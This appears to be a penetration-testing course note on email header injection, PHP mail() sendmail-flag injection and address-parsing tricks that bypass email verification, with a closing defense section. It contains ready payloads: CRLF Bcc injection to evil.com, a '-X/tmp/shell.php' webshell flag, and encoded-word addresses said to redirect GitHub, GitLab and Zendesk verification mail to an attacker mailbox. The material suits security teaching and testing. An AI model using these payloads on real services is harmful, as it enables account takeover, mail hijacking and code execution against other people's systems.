---
tags: [vapt, injection, email, header-injection, account-takeover, smtp, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.21 Email Header Injection & Address Spoofing"
---

# 10.21 — Email Header Injection & Address Spoofing

## What is it?
Apps send email everywhere — signups, password resets, contact forms, notifications. Two bug families live here:

1. **Email header injection** — user input flows into the raw email (To/Cc/Subject/body) without sanitising newlines. A `%0A`/`%0D` lets you inject **new headers** (add recipients, change subject, rewrite the body) or, via `mail()`'s 5th parameter, reach **command execution**.
2. **Email address parsing abuse** — mail systems disagree about what an address *means*. By exploiting tags, comments, quotes, IPs and **encoded characters**, you can register/verify an address that the app reads as one thing and the mail server delivers to **another** — leading to verification bypass and **account takeover**.

Think of an email like a postcard the app writes for you. If it copies your message onto the postcard verbatim — including the line where you wrote "P.S. also mail a copy to the attacker" — the post office obeys.

## Part 1 — Header injection (CRLF in mail fields)
Inject `%0A` (LF) / `%0D` (CR) to add headers after a controlled field:

| Goal | Payload |
|---|---|
| Add Cc / Bcc | `From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com` |
| Add extra To | `From:sender@domain.com%0ATo:attacker@domain.com` |
| Inject/replace Subject | `From:sender@domain.com%0ASubject:This is%20Fake%20Subject` |
| Rewrite the body | `From:sender@domain.com%0A%0AMy%20New%20Fake%20Message.` (double line-feed starts the body) |

## Part 2 — PHP `mail()` → RCE
`mail($to, $subject, $message, $additional_headers, $additional_parameters)`.
The **5th parameter** (`$additional_parameters`) is appended to the `sendmail` command line. It's filtered with `escapeshellcmd()` — which still allows **injecting extra sendmail flags**. Depending on the MTA (Sendmail/Postfix/Exim), attacker-controlled flags can **write files or execute commands** (classic `-X`/`-O` log-to-file → webshell). If you control parameter 5, treat it as a path to RCE.
> Reference technique: "Pwning PHP mail() for Fun and RCE" (exploitbox).

## Part 3 — Address parsing abuse (verification bypass / ATO)
Goal: get a verification email for `victim@company.com` delivered to **your** mailbox, or register an address that a downstream service trusts.

**Ignored parts** (normalised away by many servers):
- Tags: `john.doe+intigriti@example.com` → `john.doe@example.com`
- Comments: `john.doe(intigriti)@example.com` → `john.doe@example.com`

**IP-literal domains:**
- `john.doe@[127.0.0.1]`
- `john.doe@[IPv6:2001:db8::1]`

**Encoded-word injection** (RFC 2047 `=?charset?enc?...?=`) to smuggle a second address into the "name" so the verification mail goes elsewhere. Goal shape:
```text
RCPT TO:<"collab@psres.net>collab"@example.com>
```
Encoding formats:
```text
=?utf-8?q?=41=42=43?=hi@example.com      -> ABChi@example.com   (Q / hex)
=?utf-8?b?QUJD?=hi@example.com           -> ABChi@example.com   (Base64)
=?iso-8859-1?q?=61=62=63?=hi@example.com
=?utf-7?q?<utf-7 string>?=hi@example.com
x@xn--svg/-9x6                           -> x@<svg/             (punycode)
```
Real-world working payloads (deliver verification to `collab@psres.net`):
- **GitHub:** `=?x?q?collab=40psres.net=3e=00?=foo@example.com` (`=40`=@, `=3e`=>, `=00`=null)
- **Zendesk:** `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- **GitLab:** `=?x?q?collab=40psres.net_?=foo@example.com` (`_` = space separator)
- **Punycode:** injected `<style` into Joomla → CSS exfil of CSRF token.

**PHP 256 overflow** trick: `chr` wraps mod 256, so `String.fromCodePoint(0x10000 + 0x40)` (𐁀) can collapse to `@`.

## Part 4 — Adjacent email abuses
- **XSS via email name:** providers like GitHub/Salesforce let you make an address containing an XSS payload; if a relying service renders the email unsanitised → stored XSS.
- **Account takeover via unverified SSO email:** if an SSO IdP (e.g. Salesforce) issues accounts **without verifying** the email, and another service **trusts** that IdP's email claim, you can log in as anyone.
- **Reply-To redirection:** send `From: company.com` with `Reply-To: attacker.com`; automatic replies (sent because the mail looked internal) reach the attacker.
- **Hard Bounce Rate DoS:** services like AWS SES suspend senders past ~10% hard bounces. Flooding a victim's sending with invalid recipients can get their email capability **blocked**.

## ASCII Diagram
```text
================================================================================
                    EMAIL ENCODED-WORD ADDRESS SPLITTING
================================================================================

  App registration form:
    email = =?x?q?collab=40psres.net=3e=00?=foo@example.com
                       |
                       v
  App-side validator sees:  "...foo@example.com"   (looks fine, your domain)
                       |
                       v
  Mail server DECODES =40(@) =3e(>) =00(null):
    RCPT TO: collab@psres.net    <-- verification email goes HERE (attacker)
================================================================================
```

## Hands-on workflow
1. **Header injection:** in any field that lands in an email (contact form, "send to a friend"), inject `%0ABcc:you@evil.com` and a `%0A%0A` body. Check if you receive the Bcc.
2. **PHP mail():** if the app uses `mail()` and you reach parameter 5, attempt sendmail flag injection (`-X/tmp/shell.php`).
3. **Address abuse:** at signup/verification, submit encoded-word payloads above; watch which mailbox actually receives the verification.
4. **Tools:** Burp **Turbo Intruder** script for email-splitting fuzzing; **Hackvertor** for crafting encoded payloads.

## Defense
- **Strip CR/LF** (`\r`, `\n`, `%0d`, `%0a`) and reject them in any user value placed into email headers.
- Use a mail **library/API that separates fields** (no raw header concatenation); never let user input reach `mail()`'s 5th parameter.
- **Canonicalise & re-validate** the email the same way your MTA will (decode RFC 2047, reject IP literals/comments where not needed), and **only trust verified** emails for auth decisions.
- For SSO, require the IdP to assert a **verified** email; don't trust unverified claims.

## Related
- [[../I - 10 - Injection Attacks/01 - CRLF Injection]] — the newline-injection primitive underneath
- [[../B - 16 - Authentication/01 - Authentication Overview]] — verification bypass → account takeover
- [[../I - 33 - Information Disclosure/01 - Information Disclosure Overview]] — Reply-To / bounce info leaks
